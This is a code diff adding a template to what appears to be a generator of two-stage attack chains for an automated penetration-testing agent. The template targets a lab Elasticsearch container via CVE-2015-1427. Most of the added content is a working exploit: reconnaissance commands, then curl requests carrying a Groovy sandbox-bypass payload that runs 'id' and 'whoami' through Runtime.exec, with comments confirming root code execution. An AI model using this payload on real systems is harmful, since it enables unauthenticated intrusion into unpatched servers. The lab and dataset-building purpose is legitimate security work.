@@ -840,6 +840,101 @@ TWO_STAGE_TEMPLATES = [
         ],
     },
     {
+        # es_groovy_rce_chain -- a genuinely different vuln CLASS from
+        # everything else in this file so far: an unauthenticated RCE
+        # confirmed via plain curl (no sqlmap/commix/hydra needed at all),
+        # closing the "obtain a shell" loop with a real, unambiguous
+        # positive result rather than wp2shell_full_chain's honest-
+        # negative sqlmap/commix pass. Targets elasticsearch/CVE-2015-1427
+        # (Groovy sandbox bypass RCE, ES 1.3.8/1.4.3 and earlier) -- ES's
+        # own `_search` endpoint accepts a `script_fields` clause with a
+        # Groovy script that ES 1.x insufficiently sandboxed, letting an
+        # unauthenticated request reach `Runtime.exec()` directly. Single
+        # container, port 9200, no web-app directory structure to enumerate
+        # (gobuster/dirb/ffuf/katana would find nothing meaningful here --
+        # deliberately not included, unlike wp2shell_full_chain, since
+        # forcing every tool into every recipe regardless of fit would be
+        # padding, not real tool-diversity).
+        #
+        # LIVE-VERIFIED manually before templating (this file's established
+        # habit -- see wp2shell_full_chain's own live-run-gotcha notes for
+        # why): confirmed real root-level code execution --
+        # `"lupin" : [ "uid=0(root) gid=0(root) groups=0(root)\n" ]` in the
+        # response body. One real gotcha found doing this: ES 1.x search is
+        # near-real-time, not immediately consistent -- searching
+        # IMMEDIATELY after indexing the seed doc returned `"total": 0`
+        # (script_fields only evaluates against MATCHED hits, so zero
+        # matches means the script never runs, silently looking like the
+        # RCE itself failed rather than a timing issue). Fixed by an
+        # explicit `POST /{index}/_refresh` between the seed-doc POST and
+        # the exploit request -- this is the real reason stage_2 refreshes
+        # before exploiting rather than relying on ES's default ~1s
+        # refresh interval, which is not a safe assumption to bake into an
+        # automated chain.
+        #
+        # `condition_check` matches on stage_1's `ES_CHECK:"number"`
+        # marker (a curl against the ES root endpoint, which returns the
+        # real version in valid JSON) -- same reasoning as
+        # wp2shell_full_chain's WPJSON_CHECK: deterministically the first
+        # thing this chain prints, so it's guaranteed to survive
+        # pipeline_chain_builder.py's 300-char stage-1-summary truncation
+        # regardless of how much nmap/nuclei output follows it.
+        #
+        # nuclei's `-tags elasticsearch` (not a guessed template path --
+        # confirmed live via `grep tags:` on the real installed
+        # nuclei-templates checkout) matches
+        # http/cves/2015/CVE-2015-1427.yaml directly, this recipe's own
+        # target CVE, by name.
+        "template_id": "es_groovy_rce_chain",
+        "verified": True,
+        "condition_check": 'ES_CHECK:"number"',
+        "stage_1": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "echo \"ES_CHECK:$(curl -s http://{target}:9200/ "
+                    "| grep -oE '\\\"number\\\" *: *\\\"[0-9.]+\\\"')\" ; "
+                    "timeout 60 naabu -host {target} -p 9200 -silent "
+                    "| tee /tmp/es_ports.txt >/dev/null ; "
+                    "timeout 60 nmap -sV -p9200 {target} "
+                    "| tee /tmp/es_nmap.txt >/dev/null ; "
+                    "timeout 120 nuclei -target http://{target}:9200 "
+                    "-tags elasticsearch -silent | tee /tmp/es_nuclei.txt ; "
+                    "searchsploit elasticsearch 2>&1 | tee /tmp/es_searchsploit.txt"
+                ),
+            },
+        ],
+        "stage_2": [
+            {
+                "tool": "run_command",
+                "command": (
+                    "timeout 30 curl -s -X POST "
+                    "\"http://{target}:9200/{index_name}/blog/\" "
+                    "-H \"Content-Type: application/json\" "
+                    "-d '{{\"name\":\"pipeline_test\"}}' ; "
+                    "timeout 30 curl -s -X POST "
+                    "\"http://{target}:9200/{index_name}/_refresh\" ; "
+                    "echo \"--- groovy RCE: id ---\" ; "
+                    "timeout 30 curl -s -X POST \"http://{target}:9200/_search?pretty\" "
+                    "-H \"Content-Type: application/text\" "
+                    "-d '{{\"size\":1, \"script_fields\": {{\"lupin\":{{\"lang\":\"groovy\","
+                    "\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\")"
+                    ".getRuntime().exec(\\\"id\\\").getText()\"}}}}}}' ; "
+                    "echo \"--- groovy RCE: whoami ---\" ; "
+                    "timeout 30 curl -s -X POST \"http://{target}:9200/_search?pretty\" "
+                    "-H \"Content-Type: application/text\" "
+                    "-d '{{\"size\":1, \"script_fields\": {{\"lupin\":{{\"lang\":\"groovy\","
+                    "\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\")"
+                    ".getRuntime().exec(\\\"whoami\\\").getText()\"}}}}}}'"
+                ),
+            },
+            {"tool": "run_metasploit", "commands": "search elasticsearch groovy"},
+        ],
+        "variations": [
+            {"target": "172.27.0.2", "index_name": "website"},
+        ],
+    },
+    {
         # STRUCTURED run_medusa call in stage_2 -- medusa had ZERO
         # examples anywhere in the corpus before this template (one of
         # the 4 tools README's Known Gaps calls out by name). Genuinely
